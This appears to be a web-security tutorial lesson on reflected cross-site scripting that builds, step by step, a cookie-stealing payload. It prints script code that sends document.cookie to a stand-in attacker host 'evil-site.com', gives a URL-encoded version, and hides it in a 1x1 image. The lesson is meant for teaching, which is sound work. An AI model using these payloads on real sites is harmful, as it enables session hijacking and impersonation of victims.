# Reflected XSS

We got introduced to **Reflected XSS** in the previous section, in short it is a type of vulnerability that gets reflected to you when triggered.

We discussed in previous example how we could send some URL string like,

`https://https://example-site.com/search?term=<script>alert("XSS")</script>`

and the user visiting the URL will be greeted with `XSS`.
Well, this isn't the thing that a malicious attacker would do, is it?

So, how can we convert the above code to something harmful?

>**Note:** The purpose of this lesson is to teach you how malicious actors think, and not how to become one.

Let's imagine you are logged in to that e-commerce site.
And say it uses cookie based authentication mechanism. Which means anyone who has your cookies can impersonate the server to think that the user is actually you.

Let us say we are *attacker* and the user who has no idea what we are going to do is *victim*.

As an attacker, our goal is to impersonate the server to think we are the *victim* user.But, we need ourself to authenticate using login credentials. Sad thing is, *we don't have it!*.

**Let's steal! ;)**

We need `document.cookie`, it is a variable that stores cookies of every site you visit, individually.

Now we know what we need to include in the code.

```html
  <script>alert(document.cookie)</script>
```

Voila! We see our cookies in the alert box. You might think this is it. But, when a victim visits our new url,

`https://fake-ecommerce-121255.com/search?term=<script>alert(document.cookie)</script>`

the victim sees the cookie and wonder's th!

But, we don't actually have it, do we? Now, to actually get the cookie we use a neat idea.

Let's say we have a evil website `https://evil-site.com`.

What we try to do is send a HTTP request to our evil site with cookies in the URL parameter and later retrieve it. But, how?

What if we sent it using a HTTP Request from an image! 

Like,

```html
<img src="https://evil-site.com/cookie?cookie=victim-cookie-here">
```

Looks like a  good idea, but how are we gonna attach `document.cookie` in `src` attribute. 

That isn't possible as attributes doesn't support string concatenation like **JavaScript**.

Let's think it clearly, we can use `script` tag though!

So lets use `document.write` to output `img` tag instead of putting `img` directly,

```html
  <script>document.write("<img src='https://evil-site.com/cookie?cookie=" + document.cookie + " '>")</script>
```

Now, lets paste the above code in the URL query parameter. 

It doesn't work! Wth! What happened? The payload didn't work because of how the browser URL works, you must **URL Encode** them before sending.

`%3Cscript%3Edocument.write%28%22%3Cimg%20src%3D%27https%3A%2F%2Fevil-site.com%2Fcookie%3Fcookie%3D%22%20%2B%20document.cookie%20%2B%20%22%20%27%3E%22%29%3C%2Fscript%3E`

This is the final payload, now this will send the `document.cookie` to the evil site that we provided.

But in real life, wouldn't it be better if we could hide that weird image thumbnail?

Let's set width and height for the image.

```html
  <script>document.write("<img width='1' height='1' src='https://evil-site.com/cookie?cookie=" + document.cookie + " '>")</script>
```

Voila! No image at all! You can now play around with various tags and attributes and explore further.